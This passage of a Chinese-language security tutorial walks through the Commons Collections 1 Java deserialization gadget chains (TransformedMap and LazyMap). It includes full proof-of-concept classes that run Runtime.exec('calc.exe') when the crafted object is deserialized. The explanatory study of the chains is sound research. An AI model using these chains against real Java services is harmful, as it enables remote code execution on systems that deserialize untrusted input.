上面的Test1并只是一个本地测试，而我们还需要将最终生成的outerMap对象变成一个序列化流；  
**代码1**  
Runtime类没有实现Serializable接⼝，不能被直接序列化；所以我们需要通过反射来获取Runtime对象；
    Transformer[] transformers = new Transformer[] {
                //传入Runtime类
                new ConstantTransformer(Runtime.class),
                //调用getMethod方法
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                //调用invoke方法
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                //调用exec方法
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
**代码2**  
当调用ChainedTransformer的transformer方法时，会对transformers数组进行一系列回调：
    Transformer transformerChain = new ChainedTransformer(transformers);
  * 将ConstantTransformer返回的`Runtime.class`传给第一个InvokerTransformer；
  * 将第一个InvokerTransformer返回的`(Runtime.class).getMethod("getRuntime",null)`传给第二个InvokerTransformer；
  * 将第二个InvokerTransformer返回的`((Runtime.class).getMethod("getRuntime",null)).invoke(null,null)`传给第三个InvokerTransformer；
  * `(((Runtime.class).getMethod("getRuntime",null)).invoke(null,null)).exec("calc")`是第三个InvokerTransformer的返回值。
**代码3**  
用了TransformedMap修饰Map对象，decorate方法中又new了一个TransformedMap对象，transformerChain作为参数传进去；
    Map innerMap = new HashMap();
     innerMap.put("value", "xxxx");
     Map outerMap = TransformedMap.decorate(innerMap, null,
    transformerChain);
TransformedMap类中的注释说到Map的put方法和Map.Entry的setValue方法会受到该类的影响；  
TransformedMap继承于AbstractInputCheckedMapDecorator类，而AbstractInputCheckedMapDecorator又继承于AbstractMapDecorator类，AbstractMapDecorator类继承于Map类；
跟到AbstractInputCheckedMapDecorator类的setValue方法；  
最后其实是调用Map.setValue()；
跟进checkSetValue方法到TransformedMap类，注释中也提到调用setValue方法时自动调用checkSetValue方法；  
这里调用了valueTransformer的transform方法，而valueTransformer就是我们传入的transformerChain，transformerChain又是ChainedTransformer的实例化对象，也就是成功调用了ChainedTransformer的transformer方法，从而实现代码2对transformers数组进行回调。  
**代码4**  
通过反射获取AnnotationInvocationHandler类对象，获取构造方法，实例化一个对象handler；
    Class clazz =
    Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
     Constructor construct = clazz.getDeclaredConstructor(Class.class,
    Map.class);
     construct.setAccessible(true);
     InvocationHandler handler = (InvocationHandler)
    construct.newInstance(Retention.class, outerMap);
看一下`sun.reflect.annotation.AnnotationInvocationHandler`类，它的构造函数中第一个参数是个Annotation类，第⼆个是参数就是前⾯构造的Map；  
这是一个内部类，需要通过反射来获取；  
在它的readObject方法中调用了setValue方法，也就是说反序列化时会调用setValue方法，进而实现上面几部分代码。
然而只有当if判断为真时才会进入分支执行setValue方法，也就是说var7不能为null；  
var7不为null需要满足以下两个条件：
  * 第一个参数必须是Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设方法名为X
  * 被`TransformedMap.decorate`修饰的Map中必须有⼀个键名为X的元素
而Retention恰好是Annotation类，含有⼀个value方法；  
所以这里是创建`Retention.class`的对象；  
然后，为了再满⾜第⼆个条件，需要给Map中放⼊⼀个键名为value的元素，所以在代码3中要给Map对象加一个键名为value的元素；
下面大概跟一下为什么键名要和方法名相同；  
在`AnnotationInvocationHandler`的readObject方法中，跟进
    var2 = AnnotationType.getInstance(this.type);
var0就是我们传入的`Retention`，再跟进`AnnotationType`；  
第一处返回了`Retention`类中的所有方法到var2；  
第二处通过for循坏，获取方法名到var7；  
第三处将获取到的方法名put到`memberTypes`。
`Retention`类中就只有一个value方法，所以`memberTypes`的值就是value；  
再回到`AnnotationInvocationHandler`类，var3的值就是value；
    Map var3 = var2.memberTypes();
接下来：
    while(var4.hasNext()) {
            //遍历Map
            Entry var5 = (Entry)var4.next();
            //获取Map的键名
            String var6 = (String)var5.getKey();
            //在var3中寻找是否有键名为var6的值,如果在这里没有找到,则返回了null,
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }
所以为了能var3中找到键名为value的值，需要给Map对象put一个键名为value的元素。
最后加上序列化和反序列化的代码，整理为如下POC：
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.util.HashMap;
    import java.util.Map;
    public class Test2 {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            innerMap.put("value", "xxxx");
            Map outerMap = TransformedMap.decorate(innerMap, null,transformerChain);
            Class clazz =Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);
            construct.setAccessible(true);
            InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class, outerMap);
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(barr);
            oos.writeObject(handler);
            oos.close();
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
            Object o = (Object)ois.readObject();
        }
    }
这个POC只有在Java 8u71以前的版本中才能执行成功，Java
8u71以后的版本由于`sun.reflect.annotation.AnnotationInvocationHandler`发⽣了变化导致不再可⽤；  
在ysoserial的代码中，没有⽤到上面POC的TransformedMap，而是改用了了LazyMap。
## LazyMap链
LazyMap也来自于Common-Collections库，并继承`AbstractMapDecorator`类。  
LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的factory.transform
。  
当在get找不到值的时候，它会调用`factory.transform`方法去获取一个值：  
代码1和代码2与TransformedMap链中的一样；
**代码3**
    Map innerMap = new HashMap();
    Map outerMap = LazyMap.decorate(innerMap, transformerChain);
因为要满足`map.containsKey(key) == false`，就不需要向Map中添加元素；  
把transformerChain传进去，transformerChain是Transformer类型的；  
看一下`LazyMap.decorate`方法：  
new了一个LazyMap对象；  
get方法中的`factory`就是我们传入的transformerChain，也就是说，只要调用了get方法，并且Map对象中的没有key，就可以触发ChainedTransformer的transform方法，从而实现代码2对transformers数组进行回调，进而执行命令。
现在要找一个调用get方法的地方；  
在AnnotationInvocationHandler类的invoke方法中调用了get方法：  
那又要如何调用到invoke方法；  
P牛的文章中说到：
  * 我们如果将AnnotationInvocationHandler对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get。
Java动态代理知识可参考：[Java 动态代理](http://1.15.187.227/index.php/archives/457/ "Java
动态代理")
**代码4**  
通过反射获取`sun.reflect.annotation.AnnotationInvocationHandler`对象，再对该对象进行Proxy；
    Class clazz =Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
    construct.setAccessible(true);
    InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class, outerMap);
    Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
`Proxy.newProxyInstance`的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。
代理后的对象叫做proxyMap，但不能直接对其进行序列化，因为入口点是`sun.reflect.annotation.AnnotationInvocationHandler#readObject`，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹：
    handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);
最后添加上序列化和反序列化的代码整理为如下POC：
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.Map;
    public class Test3 {
        public static void main(String[] args) throws Exception{
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            Map outerMap = LazyMap.decorate(innerMap, transformerChain);
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
            construct.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
            Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
            handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(barr);
            oos.writeObject(handler);
            oos.close();
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
            Object o = (Object)ois.readObject();
        }
    }
成功执行命令：  
参考连接：  
Java安全漫谈 - 09.反序列化篇(3)  
Java安全漫谈 - 10.反序列化篇(4)  
Java安全漫谈 - 11.反序列化篇(5)  